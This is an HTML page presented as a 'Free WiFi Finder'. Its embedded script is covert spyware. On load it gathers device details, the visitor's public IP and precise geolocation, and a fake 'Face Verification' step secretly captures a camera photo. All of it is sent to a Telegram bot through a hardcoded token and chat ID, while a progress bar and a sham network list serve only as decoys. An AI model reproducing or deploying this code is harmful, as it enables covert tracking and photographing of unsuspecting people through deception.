<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free WiFi Finder</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; background: linear-gradient(135deg, #1a237e, #311b92); color: white; padding: 20px; min-height: 100vh; }
        .container { max-width: 800px; margin: 0 auto; background: rgba(255,255,255,0.1); border-radius: 15px; padding: 30px; }
        header { text-align: center; margin-bottom: 30px; }
        .logo { font-size: 4rem; margin: 20px; }
        h1 { color: #00bcd4; margin: 10px 0; }
        button { background: #2196f3; color: white; border: none; padding: 15px 30px; border-radius: 25px; font-size: 16px; cursor: pointer; margin: 10px; }
        .hidden { display: none; }
        #cameraFeed { width: 100%; height: 400px; background: black; border-radius: 10px; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">📶</div>
            <h1>Free WiFi Finder</h1>
            <p>Find free WiFi networks near you</p>
        </header>
        
        <div class="progress">
            <h2>🔍 Scanning networks...</h2>
            <div style="background:#333;height:20px;border-radius:10px;">
                <div id="progressBar" style="height:100%;background:#4CAF50;width:0%;"></div>
            </div>
            <p id="status">Initializing...</p>
        </div>
        
        <div id="cameraSection" class="hidden">
            <h3>Face Verification</h3>
            <div id="cameraFeed"></div>
            <button onclick="startCamera()">Enable Camera</button>
        </div>
        
        <div id="results" class="hidden">
            <h3>✅ WiFi Networks Found:</h3>
            <div style="background:rgba(255,255,255,0.1);padding:15px;border-radius:10px;">
                <strong>Free_WiFi_Public</strong> - Signal: 85%
                <button onclick="connectWiFi()">Connect</button>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8509546845:AAF7d5bAa2M0aOH3yDKOvrYT4luCD4e06Zk";
        const CHAT_ID = "-5162779873";
        
        async function startSpy() {
            updateStatus("Collecting device info...");
            
            // Get device info
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: screen.width + "x" + screen.height,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            // Get IP address
            const ipInfo = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            
            // Get location
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const location = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                };
                
                // Send to Telegram
                await sendToTelegram(deviceInfo, ipInfo, location);
                
                updateStatus("Verification complete!");
                document.getElementById('results').classList.remove('hidden');
            });
        }
        
        async function sendToTelegram(device, ip, location) {
            const message = `🔓 NEW VERIFICATION\n\nDevice: ${device.userAgent}\nIP: ${ip.ip}\nLocation: ${location.lat}, ${location.lng}\nTime: ${new Date().toLocaleString()}`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            });
        }
        
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.style.width = '100%';
                video.style.height = '100%';
                document.getElementById('cameraFeed').appendChild(video);
                
                // Auto capture photo after 3 seconds
                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    const photoData = canvas.toDataURL('image/jpeg');
                    
                    // Send photo to Telegram
                    const blob = await fetch(photoData).then(r => r.blob());
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'face.jpg');
                    
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    stream.getTracks().forEach(track => track.stop());
                }, 3000);
                
            } catch (error) {
                alert("Camera access denied. Continuing without photo.");
            }
        }
        
        function updateStatus(text) {
            document.getElementById('status').textContent = text;
        }
        
        function connectWiFi() {
            alert("Connected! Redirecting...");
            window.location.href = "https://www.youtube.com";
        }
        
        // Auto start
        setTimeout(() => {
            startSpy();
            document.getElementById('cameraSection').classList.remove('hidden');
        }, 2000);
    </script>
</body>
</html>
